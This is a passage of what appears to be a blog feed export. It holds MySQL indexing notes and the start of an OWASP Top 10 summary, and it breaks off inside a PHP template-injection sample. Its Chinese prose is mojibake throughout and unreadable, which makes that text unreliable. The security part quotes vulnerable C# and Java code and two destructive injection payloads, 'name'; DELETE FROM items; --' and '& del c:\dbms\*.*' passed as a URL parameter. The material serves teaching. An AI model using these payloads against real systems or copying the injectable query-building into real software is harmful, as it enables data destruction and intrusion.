src="https://gitee.com/Extrader/blogimage/raw/master/image/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210410153354423.png" alt loading="lazy"></p><p>Bæ ‘çš„é˜¶ä¸ºèŠ‚ç‚¹çš„æœ€å¤šçš„å­èŠ‚ç‚¹æ•°</p><p>Bæ•°çš„æœç´¢æ–¹å¼ä»æ ¹èŠ‚ç‚¹å¼€å§‹ï¼Œå¯¹èŠ‚ç‚¹å†…çš„å…³é”®å­—ï¼ˆæœ‰åºï¼‰åºåˆ—è¿›è¡ŒäºŒåˆ†æŸ¥æ‰¾ï¼Œå¦‚æœå‘½ä¸­åˆ™ç»“æŸï¼Œå¦åˆ™è¿›å…¥æŸ¥è¯¢å…³é”®å­—æ‰€å±èŒƒå›´çš„å„¿å­èŠ‚ç‚¹ï¼Œå¶å­èŠ‚ç‚¹å’Œéå¶å­èŠ‚ç‚¹éƒ½å­˜æ”¾æ•°æ®ï¼Œæœç´¢æœ‰å¯èƒ½åœ¨éå¶å­èŠ‚ç‚¹ç»“æŸã€‚</p><h4 id="B-æ ‘"><a href="#B-æ ‘" class="headerlink" title="B+æ ‘"></a>B+æ ‘</h4><p>B+ æ ‘æ˜¯ B æ ‘çš„å˜ä½“ï¼Œä¹Ÿæ˜¯ä¸€ç§å¤šè·¯æœç´¢æ ‘ã€‚</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210410154531450.png" alt loading="lazy"></p><p>B+æ ‘åªæœ‰åˆ°è¾¾å¶å­èŠ‚ç‚¹æ‰å‘½ä¸­ï¼Œå³æ‰€æœ‰å…³é”®å­—éƒ½å‡ºç°åœ¨å¶å­èŠ‚ç‚¹é“¾è¡¨ä¸­</p><ul><li>æ•°æ®åªèƒ½åœ¨å¶å­èŠ‚ç‚¹ï¼Œä¹Ÿå« <strong>ç¨ å¯†ç´¢å¼•</strong>ï¼Œä¸”é“¾è¡¨ä¸­çš„å…³é”®å­—ï¼ˆæ•°æ®ï¼‰æ°å¥½æ˜¯æœ‰åºçš„ã€‚</li></ul><p>éå¶å­èŠ‚ç‚¹ç›¸å½“äºæ˜¯å¶å­èŠ‚ç‚¹çš„ç´¢å¼•ï¼Œä¹Ÿå« <strong>ç¨€ç–ç´¢å¼•</strong>ï¼Œå¶å­èŠ‚ç‚¹ç›¸å½“äºæ˜¯å­˜å‚¨ï¼ˆå…³é”®å­—ï¼‰æ•°æ®çš„æ•°æ®å±‚</p><p>B+æ•°å¯¹äºBæ•°çš„ä¼˜åŠ¿</p><ul><li>å•ä¸€èŠ‚ç‚¹å­˜å‚¨çš„å…ƒç´ å¤šï¼Œä½¿å¾—æŸ¥è¯¢çš„IOæ¬¡æ•°æ›´å°‘ï¼Œé€‚åˆåšMySQLçš„åº•å±‚æ•°æ®ç»“æ„</li><li>æ‰€æœ‰æŸ¥è¯¢éƒ½è¦æŸ¥åˆ°å¶å­èŠ‚ç‚¹ï¼ŒæŸ¥è¯¢æ€§èƒ½ç¨³å®š</li><li>æ‰€æœ‰å¶å­èŠ‚ç‚¹å½¢æˆä¸€ä¸ªæœ‰åºçš„é“¾è¡¨ï¼Œä¾¿äºæŸ¥æ‰¾</li></ul><h4 id="å“ˆå¸Œç´¢å¼•"><a href="#å“ˆå¸Œç´¢å¼•" class="headerlink" title="å“ˆå¸Œç´¢å¼•"></a>å“ˆå¸Œç´¢å¼•</h4><p>åªæœ‰ç²¾ç¡®åŒ¹é…ç´¢å¼•æ‰€æœ‰åˆ—çš„æŸ¥è¯¢æ‰æœ‰æ•ˆã€‚æ¯è¡Œæ•°æ®å­˜å‚¨å¼•æ“éƒ½ä¼šå¯¹æ‰€æœ‰çš„ç´¢å¼•åˆ—è®¡ç®—ä¸€ä¸ªå“ˆå¸Œç ï¼Œå“ˆå¸Œç´¢å¼•å°†å“ˆå¸Œç å­˜å‚¨åœ¨ç´¢å¼•ä¸­ï¼ŒåŒæ—¶åœ¨å“ˆå¸Œè¡¨ä¸­ä¿å­˜æŒ‡å‘æ¯ä¸ªæ•°æ®è¡Œçš„æŒ‡é’ˆã€‚å› ä¸ºç´¢å¼•è‡ªèº«åªå­˜å‚¨å¯¹åº”çš„å“ˆå¸Œå€¼ï¼Œæ‰€ä»¥ç´¢å¼•çš„ç»“æ„ååˆ†ç´§å‡‘ï¼Œå“ˆå¸Œç´¢å¼•æŸ¥æ‰¾çš„é€Ÿåº¦éå¸¸å¿«ã€‚ä½†æ˜¯</p><ul><li>ä¸æŒ‰ç…§ç´¢å¼•é¡ºåºå­˜å‚¨ï¼Œæ— æ³•ç”¨äºæ’åº</li><li>ä¸æ”¯æŒéƒ¨åˆ†ç´¢å¼•æŸ¥æ‰¾åŒ¹é…</li><li>ä¸æ”¯æŒèŒƒå›´æŸ¥æ‰¾</li></ul><h4 id="èšé›†ç´¢å¼•"><a href="#èšé›†ç´¢å¼•" class="headerlink" title="èšé›†ç´¢å¼•"></a>èšé›†ç´¢å¼•</h4><p>ç”±B+æ ‘å®ç°ï¼Œä¸€ä¸ªè¡¨åªèƒ½æœ‰ä¸€ä¸ªèšé›†ç´¢å¼•ï¼ŒInnoDBè¡¨ä¸­èšé›†ç´¢å¼•çš„ç´¢å¼•åˆ—å°±æ˜¯ä¸»é”®ï¼Œæ‰€ä»¥èšé›†ç´¢å¼•ä¹Ÿå«ä¸»é”®ç´¢å¼•ã€‚å¦‚ä¸‹è¡¨ï¼š</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">table</span> Student<span class="token punctuation">(</span>    id <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token keyword">primary</span> <span class="token keyword">key</span> <span class="token keyword">auto_increment</span><span class="token punctuation">,</span>    last_name <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span>     first_name <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span>     birthday <span class="token keyword">date</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>èšé›†ç´¢å¼•çš„ç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210410161154845.png" alt loading="lazy"></p><blockquote><p>èšç°‡ç´¢å¼•ï¼šç´¢å¼•çš„å¶èŠ‚ç‚¹æŒ‡å‘æ•°æ®</p><p>éèšç°‡ç´¢å¼•ï¼šç´¢å¼•çš„å¶èŠ‚ç‚¹æŒ‡å‘æ•°æ®çš„å¼•ç”¨</p><p>myisamä½¿ç”¨éèšç°‡ç´¢å¼•ï¼Œinnodbä½¿ç”¨èšç°‡ç´¢å¼•</p></blockquote><h4 id="äºŒçº§ç´¢å¼•"><a href="#äºŒçº§ç´¢å¼•" class="headerlink" title="äºŒçº§ç´¢å¼•"></a>äºŒçº§ç´¢å¼•</h4><p>å¯¹äºInnoDBè¡¨ï¼Œåœ¨éä¸»é”®åˆ—çš„å…¶ä»–åˆ—ä¸Šå»ºçš„ç´¢å¼•å°±æ˜¯äºŒçº§ç´¢å¼•ï¼ˆå› ä¸ºèšé›†ç´¢å¼•åªæœ‰ä¸€ä¸ªï¼‰ã€‚</p><p>åœ¨MySQLä¸­ä¸»é”®ç´¢å¼•çš„å¶å­èŠ‚ç‚¹å­˜çš„æ˜¯æ•´è¡Œæ•°æ®ï¼Œè€ŒäºŒçº§ç´¢å¼•å¶å­èŠ‚ç‚¹å†…å®¹æ˜¯ä¸»é”®çš„å€¼ã€‚</p><p>è¯¦è§ï¼š<a href="http://mysql.taobao.org/monthly/2020/01/01/">MySQL Â· å¼•æ“ç‰¹æ€§ Â· äºŒçº§ç´¢å¼•åˆ†æ</a></p><h3 id="ç´¢å¼•ä¼˜åŒ–"><a href="#ç´¢å¼•ä¼˜åŒ–" class="headerlink" title="ç´¢å¼•ä¼˜åŒ–"></a>ç´¢å¼•ä¼˜åŒ–</h3><ul><li><p>å°½é‡ä¿è¯å…¨å€¼åŒ¹é…ï¼Œå³ç´¢å¼•å­—æ®µå’Œselectå­—æ®µç›¸åŒä¸”é¡ºåºä¸€è‡´</p></li><li><p>æœ€ä½³å·¦å‰ç¼€æ³•åˆ™ï¼šå¦‚æœç´¢å¼•å¤šåˆ—ï¼Œåˆ™æŸ¥è¯¢è¦ä»ç´¢å¼•çš„æœ€å·¦åˆ—å¼€å§‹ï¼Œä¸”ä¸­é—´ä¸è·³è¿‡ç´¢å¼•ä¸­çš„åˆ—</p></li><li><p>ä¸åœ¨ç´¢å¼•åˆ—ä¸Šåšä»»ä½•æ“ä½œ(è®¡ç®—ã€å‡½æ•°ã€ç±»å‹è½¬æ¢ã€ä¸è¦å‡ºç°éšå¼è½¬)ï¼Œä¼šå¯¼è‡´ç´¢å¼•å¤±æ•ˆè€Œå…¨è¡¨æ‰«æ</p><pre class="language-sql" data-language="sql"><code class="language-sql">å‡è®¾ç›®æ ‡è¡Œ name <span class="token operator">=</span> <span class="token string">'july'</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> name<span class="token operator">=</span><span class="token string">'july'</span><span class="token punctuation">;</span>           <span class="token comment">## èµ°ç´¢å¼• </span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> <span class="token keyword">left</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'july'</span><span class="token punctuation">;</span>   <span class="token comment">## ä¸èµ°ç´¢å¼•</span></code></pre></li><li><p>ä¸€æ—¦å‡ºç°éç­‰å€¼å­—æ®µæ¡ä»¶åˆ¤æ–­ï¼Œåˆ™è¯¥å­—æ®µåçš„ç´¢å¼•åˆ—çš†å¤±æ•ˆ</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> a<span class="token operator">=</span><span class="token number">10</span> <span class="token operator">and</span> b<span class="token operator">=</span><span class="token number">100</span> <span class="token operator">and</span> c<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">;</span>   <span class="token comment">## å…¨ç´¢å¼•  a_b_c  </span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> a<span class="token operator">=</span><span class="token number">10</span> <span class="token operator">and</span> b<span class="token operator">></span><span class="token number">100</span> <span class="token operator">and</span> c<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">;</span>   <span class="token comment">## éƒ¨åˆ†ç´¢å¼• a_b  </span><span class="token comment">## éç­‰å€¼æ¡ä»¶åŒ…æ‹¬ï¼šin &lt; > != like ç­‰  </span><span class="token comment">## æ³¨æ„ï¼šå½“like 'aaa%' é€šé…ç¬¦åœ¨å³æ—¶ï¼Œä»ç„¶èƒ½å¤Ÿèµ°å…¨ç´¢å¼•  </span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> a<span class="token operator">=</span><span class="token number">10</span> <span class="token operator">and</span> b <span class="token operator">like</span> <span class="token string">'100%'</span> <span class="token operator">and</span> c<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">;</span>   <span class="token comment">## å…¨ç´¢å¼•  a_b_c  </span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> a<span class="token operator">=</span><span class="token number">10</span> <span class="token operator">and</span> b <span class="token operator">like</span> <span class="token string">'%100'</span> <span class="token operator">and</span> c<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">;</span>   <span class="token comment">## éƒ¨åˆ†ç´¢å¼• a</span></code></pre></li><li><p>å°½é‡ä½¿ç”¨è¦†ç›–ç´¢å¼•ï¼Œå³æŸ¥è¯¢åˆ—ä¸ºç´¢å¼•åˆ—çš„å­é›†ï¼Œå‡å°‘select * çš„ä½¿ç”¨</p></li><li><p>MySQLåœ¨ä½¿ç”¨ä¸ç­‰äº(!=æˆ–è€…&lt;&gt;)æ—¶æ— æ³•ä½¿ç”¨ç´¢å¼•ï¼Œä¼šå¯¼è‡´å…¨è¡¨æ‰«æ</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> a<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">;</span>     <span class="token comment">## èµ°ç´¢å¼•  </span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> a<span class="token operator">!=</span><span class="token number">100</span><span class="token punctuation">;</span>    <span class="token comment">## ä¸èµ°ç´¢å¼•ï¼Œå…¨è¡¨æ‰«æ</span></code></pre></li><li><p>æŸ¥è¯¢æ¡ä»¶ä¸º is NULL å’Œ is not NULLæƒ…å†µæ—¶ä¹Ÿæ— æ³•ä½¿ç”¨ç´¢å¼•</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> a <span class="token operator">is</span> <span class="token boolean">null</span><span class="token punctuation">;</span>      <span class="token comment">## ä¸èµ°ç´¢å¼•  </span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> a <span class="token operator">is</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">;</span>  <span class="token comment">## ä¸èµ°ç´¢å¼• </span></code></pre></li><li><p>likeä»¥é€šé…ç¬¦å¼€å¤´<code>(&#39;%abc...&#39;)</code>æ—¶ç´¢å¼•ä¹Ÿä¼šå¤±æ•ˆï¼Œå˜ä¸ºå…¨è¡¨æ‰«æï¼›ä½†é€šé…ç¬¦ç»“å°¾ä¾ç„¶ä¼šèµ°ç´¢å¼•ï¼Œè¯¥å­—æ®µåçš„ç´¢å¼•ä¾ç„¶å¤±æ•ˆ</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> name<span class="token punctuation">,</span> age <span class="token keyword">from</span> info <span class="token keyword">where</span> name <span class="token operator">like</span> <span class="token string">"%aaa"</span><span class="token punctuation">;</span>  <span class="token comment">## ç´¢å¼•å¤±æ•ˆ  </span><span class="token keyword">select</span> name<span class="token punctuation">,</span> age <span class="token keyword">from</span> info <span class="token keyword">where</span> name <span class="token operator">like</span> <span class="token string">"aaa%"</span><span class="token punctuation">;</span>  <span class="token comment">## ç´¢å¼•æœ‰æ•ˆ  </span><span class="token comment">## å½“ä¸šåŠ¡è¦æ±‚å¿…é¡»ä½¿ç”¨å·¦é€šé…ç¬¦æ—¶ï¼Œå¯ä½¿ç”¨è¦†ç›–ç´¢å¼•çš„æ–¹æ³•æ¥é¿å…ç´¢å¼•å¤±æ•ˆ  </span><span class="token comment">## åœ¨ä¸Šé¢ä¾‹å­ä¸­å³å»ºç«‹è”åˆç´¢å¼• name_age</span></code></pre></li><li><p>å­—ç¬¦ä¸²ä¸åŠ å•å¼•å·ä¼šå¯¼è‡´ç´¢å¼•å¤±æ•ˆ   åŸå› ï¼šéšå¼è½¬æ¢</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment">## idä¸ºvarcharç±»å‹  </span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'2000'</span><span class="token punctuation">;</span>  <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">2000</span><span class="token punctuation">;</span>  <span class="token comment">## ä¼šæœ‰éšå¼ç±»å‹è½¬æ¢</span></code></pre></li><li><p>å°½é‡å°‘ç”¨orï¼Œç”¨å®ƒæ¥è¿æ¥æŸ¥è¯¢æ¡ä»¶å¯èƒ½ä¼šå¯¼è‡´ç´¢å¼•å¤±æ•ˆ</p></li><li><p>group byåŸºæœ¬ä¸Šéƒ½éœ€è¦è¿›è¡Œæ’åºï¼Œå½“group byçš„å­—æ®µé¡ºåºå’Œç´¢å¼•é¡ºåºä¸ä¸€è‡´çš„æ—¶å€™ï¼Œå°±ä¼šå¯¼è‡´ä¸´æ—¶è¡¨çš„äº§ç”Ÿï¼Œå³åŒæ—¶å‡ºç° Using temporary å’Œ Using filesortï¼Œå› æ­¤ä¸€å®šè¦æåŠ›é¿å…</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment">## ç´¢å¼•ä¸º A_B_C  </span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> A<span class="token operator">=</span><span class="token number">10</span> <span class="token keyword">group</span> <span class="token keyword">by</span> C<span class="token punctuation">,</span> B<span class="token punctuation">;</span>  <span class="token comment">## èµ°ç´¢å¼•Aï¼Œäº§ç”Ÿä¸´æ—¶è¡¨</span></code></pre></li></ul><p><strong>å°ç»“</strong></p><ul><li>å¯¹äºå•å€¼ç´¢å¼•ï¼Œå°½é‡é€‰æ‹©é’ˆå¯¹å½“å‰æŸ¥è¯¢è¿‡æ»¤æ€§æ›´å¥½çš„ç´¢å¼•å­—æ®µ</li><li>åœ¨é€‰æ‹©è”åˆç´¢å¼•æ—¶ï¼Œå½“å‰æŸ¥è¯¢ä¸­è¿‡æ»¤æ€§æœ€å¥½çš„å­—æ®µåœ¨ç´¢å¼•å­—æ®µé¡ºåºä¸­ä½ç½®è¶Šé å‰è¶Šå¥½</li><li>åœ¨é€‰æ‹©è”åˆç´¢å¼•æ—¶ï¼Œå°½å¯èƒ½é€‰æ‹©å¯ä»¥åŒ…å«å½“å‰æŸ¥è¯¢çš„whereå­å¥ä¸­æ›´å¤šå­—æ®µçš„ç´¢å¼•ï¼Œå³å¦‚æœå¯èƒ½çš„è¯ï¼Œå°½é‡è¾¾åˆ°ç´¢å¼•è¦†ç›–ï¼Œè¿™æ ·ä¸ä»…èƒ½å¤Ÿé¿å…ç´¢å¼•å¤±æ•ˆï¼Œä¹Ÿèƒ½å¤Ÿé¿å…å›è¡¨ç­‰å½±å“æŸ¥è¯¢æ€§èƒ½ç­‰æ“ä½œ</li><li>å°½å¯èƒ½é€šè¿‡åˆ†æç»Ÿè®¡ä¿¡æ¯å’Œè°ƒæ•´æŸ¥è¯¢è¯­å¥çš„å†™æ³•æ¥è¾¾åˆ°é€‚åº”é€‰æ‹©çš„ç´¢å¼•</li></ul><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ol><li><a href="https://dev.mysql.com/doc/refman/5.7/en/innodb-storage-engine.html">The InnoDB Storage Engine</a></li><li><a href="https://dev.mysql.com/doc/refman/5.7/en/storage-engines.html">Alternative Storage Engines</a></li><li><a href="https://github.com/jaywcjlove/mysql-tutorial/blob/master/chapter3/3.5.md">æ•°æ®åº“å­˜å‚¨å¼•æ“</a></li><li><a href="https://juejin.cn/post/6854573221627297800">ç®€å•äº†è§£InnoDBåº•å±‚åŸç†</a></li><li><a href="https://zq99299.github.io/dsalg-tutorial/dsalg-java-hsp/12/03.html#b-%E6%A0%91">B æ ‘ã€B+ æ ‘ã€B*æ ‘</a></li><li><a href="https://segmentfault.com/a/1190000021488885">ä¸ºä»€ä¹ˆmysqlç´¢å¼•è¦ä½¿ç”¨B+æ ‘ï¼Œè€Œä¸æ˜¯Bæ ‘ï¼Œçº¢é»‘æ ‘</a></li><li><a href="https://juejin.cn/post/6844903919525740552">MySQLç´¢å¼•çš„åŸç†ï¼ŒB+æ ‘ã€èšé›†ç´¢å¼•å’ŒäºŒçº§ç´¢å¼•çš„ç»“æ„åˆ†æ</a></li><li><a href="https://segmentfault.com/a/1190000023441683">MySQLä¼˜åŒ–ä¹‹ç´¢å¼•ä¼˜åŒ–</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> å¤‡å¿˜å½• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Owasp_Top_10</title>
      <link href="posts/db657c/"/>
      <url>posts/db657c/</url>
      
        <content type="html"><![CDATA[<p><a href="https://owasp.org/">Owasp</a> å…¨ç§° Open Web Application Security Projectï¼ˆå¼€æ”¾å¼Webåº”ç”¨ç¨‹åºå®‰å…¨é¡¹ç›®ï¼‰ã€‚</p><p>å…¶ä¸­æœ€å…·æƒå¨çš„å°±æ˜¯å…¶â€åå¤§å®‰å…¨æ¼æ´åˆ—è¡¨â€ï¼Œç›®å‰æ­£å¼å‘å¸ƒçš„æœ€æ–°ç‰ˆæœ¬æ˜¯2017å¹´11æœˆä»½å‘å¸ƒçš„ã€‚</p><p>ä»¥ä¸‹å¯¹2017å¹´çš„Top 10ç‰ˆæœ¬åšä¸€ä¸ªå½’çº³ï¼Œä¾‹å­ä¸­ä¸å…¨çš„æ¬¢è¿å„ä½å¤§ä½¬è¯„è®ºæŒ‡å‡ºï¼Œåç»­æœ‰ä¼šæ·»åŠ ä¸Šã€‚</p><span id="more"></span><h3 id="æ³¨å…¥ï¼ˆInjectionï¼‰"><a href="#æ³¨å…¥ï¼ˆInjectionï¼‰" class="headerlink" title="æ³¨å…¥ï¼ˆInjectionï¼‰"></a>æ³¨å…¥ï¼ˆInjectionï¼‰</h3><h4 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>å½“ä¸å¯ä¿¡çš„æ•°æ®ä½œä¸ºå‘½ä»¤æˆ–æŸ¥è¯¢è¯­å¥çš„ä¸€éƒ¨åˆ†è¢«å‘é€ç»™è§£é‡Šå™¨çš„æ—¶å€™ï¼Œä¼šå‘ç”Ÿæ³¨å…¥æ¼æ´ï¼ŒåŒ…æ‹¬SQLã€NoSQLã€OSä»¥åŠLDAPæ³¨å…¥ç­‰ã€‚æ”»å‡»è€…å‘é€çš„æ¶æ„æ•°æ®å¯èƒ½ä¼šè¯±ä½¿è§£é‡Šå™¨æ‰§è¡Œè®¡åˆ’å¤–çš„å‘½ä»¤ï¼Œæˆ–åœ¨æ²¡æœ‰é€‚å½“æˆæƒçš„æƒ…å†µä¸‹è®¿é—®æ•°æ®ã€‚</p><h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><h5 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h5><pre class="language-c#" data-language="c#"><code class="language-c#">string userName &#x3D; ctx.getAuthenticatedUserName();string query &#x3D; &quot;SELECT * FROM items WHERE owner &#x3D; &#39;&quot; + userName + &quot;&#39; AND itemname &#x3D; &#39;&quot; + ItemName.Text + &quot;&#39;&quot;;sda &#x3D; new SqlDataAdapter(query, conn);DataTable dt &#x3D; new DataTable();sda.Fill(dt);</code></pre><p>æ”¹ä»£ç å‡†å¤‡æ‰§è¡Œçš„æŸ¥è¯¢å¦‚ä¸‹ï¼š</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> items <span class="token keyword">WHERE</span> owner <span class="token operator">=</span> <span class="token operator">&lt;</span>userName<span class="token operator">></span> <span class="token operator">AND</span> itemname <span class="token operator">=</span> <span class="token operator">&lt;</span>itemName<span class="token operator">></span><span class="token punctuation">;</span></code></pre><p>ä½†æ˜¯æŸ¥è¯¢æ˜¯é€šè¿‡å›ºå®šçš„æŸ¥è¯¢å­—ç¬¦å’Œç”¨æˆ·çš„è¾“å…¥å­—ç¬¦ä¸²è¿æ¥æ¥åŠ¨æ€æ„æˆçš„ï¼Œè‹¥æ”»å‡»è€…åœ¨<code>owner</code>å¤„æ„é€ <code>name&#39;; DELETE FROM items; --</code>ï¼Œåˆ™SQLè¯­å¥å˜æˆäº†</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> items <span class="token keyword">WHERE</span> owner <span class="token operator">=</span> <span class="token string">'wiley'</span> <span class="token operator">AND</span> itemname <span class="token operator">=</span> <span class="token string">'name'</span><span class="token punctuation">;</span> <span class="token keyword">DELETE</span> <span class="token keyword">FROM</span> items<span class="token punctuation">;</span> <span class="token comment">--'</span></code></pre><p>å‚è€ƒï¼š<a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: SQL Injection</a></p><p>æœ¬ç«™æ¡ˆä¾‹ï¼š<a href="https://www.extrader.top/posts/e73517db/">CTF-SQLæ³¨å…¥</a>ï¼Œ<a href="https://www.extrader.top/posts/e5cd0178/">Sqli-labsé¶åœº</a></p><h5 id="å‘½ä»¤æ³¨å…¥"><a href="#å‘½ä»¤æ³¨å…¥" class="headerlink" title="å‘½ä»¤æ³¨å…¥"></a>å‘½ä»¤æ³¨å…¥</h5><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> btype <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"backuptype"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> cmd <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token string">"cmd.exe /K \" c:\\util\\rmanDB.bat "</span> <span class="token operator">+</span> btype <span class="token operator">+</span> <span class="token string">"&amp;&amp;c:\\utl\\cleanup.bat\""</span><span class="token punctuation">)</span><span class="token class-name">System<span class="token punctuation">.</span>Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>ä»¥ä¸Šä»£ç æ¥è‡ªä¸€ä¸ªç®¡ç†webçš„åº”ç”¨ç¨‹åºï¼Œæ”¹ç¨‹åºæ—¨åœ¨å…è®¸ç”¨æˆ·ä½¿ç”¨æ‰¹å¤„ç†æ–‡ä»¶ç¨‹åºæ¥å¯¹Oracleæ•°æ®åº“è¿›è¡Œå¤‡ä»½ï¼Œç„¶åè¿è¡Œ<code>cleanup.bat</code>è„šæœ¬åˆ é™¤ä¸€äº›ä¸´æ—¶æ–‡ä»¶ï¼Œå¤‡ä»½è„šæœ¬<code>rmanDB.bat</code>æ¥æ”¶å•ä¸ªå‘½ä»¤å‚æ•°ï¼Œè¯¥å‚æ•°æŒ‡å®šè¦æ‰§è¡Œçš„å¤‡ä»½ç±»å‹ï¼Œç”±äºå¯¹æ•°æ®åº“çš„è®¿é—®å—åˆ°é™åˆ¶ï¼Œå› æ­¤è¯¥å¤‡ä»½è„šæœ¬é€šå¸¸æ˜¯ä»¥ç‰¹æƒç”¨æˆ·èº«ä»½è¿è¡Œçš„</p><p>é€šå¸¸<code>Runtime.exec()</code>å‡½æ•°ä¸ä¼šæ‰§è¡Œå¤šä¸ªå‘½ä»¤ï¼Œä½†æ˜¯åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç¨‹åºé¦–å…ˆè¿è¡Œ<code>cmd.exe shell</code>ï¼Œä»¥ä¾¿é€šè¿‡ä¸€æ¬¡è°ƒç”¨<code>Runtime.exec()</code>æ¥è¿è¡Œå¤šä¸ªå‘½ä»¤ã€‚è°ƒç”¨å®Œ<code>rmanDB</code>åï¼Œæ¥ç€è°ƒç”¨ç”±<code>&amp;&amp;</code>åˆ†éš”çš„å¤šä¸ªå‘½ä»¤ã€‚è‹¥æ”»å‡»è€…ä¼ å…¥çš„å­—ç¬¦ä¸²å½¢å¼ä¸º<code>&amp; del c:\\dbms\\*.*</code>ï¼Œé‚£ä¹ˆè¯¥åº”ç”¨ç¨‹åºå°†æ‰§è¡Œæ­¤å‘½ä»¤ä»¥åŠæ”»å‡»è€…ä¼ å…¥çš„å…¶å®ƒå‘½ä»¤ <code>del</code></p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//example.com/app/accountView?backuptype=&amp; del c:\\dbms\\*.*</code></pre><p>å‚è€ƒï¼š<a href="https://cwe.mitre.org/data/definitions/77.html">CWE-77: Command Injection</a></p><p>æœ¬ç«™æ¡ˆä¾‹ï¼š<a href="https://www.extrader.top/posts/c714e372/">CTF-å‘½ä»¤æ‰§è¡Œ</a>ï¼Œ<a href="https://www.extrader.top/posts/45c7e77/">phpå‘½ä»¤æ‰§è¡Œå°æŠ€å·§</a></p><h5 id="æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼ˆSSTIï¼‰"><a href="#æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼ˆSSTIï¼‰" class="headerlink" title="æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼ˆSSTIï¼‰"></a>æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼ˆSSTIï¼‰</h5><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require_once</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string 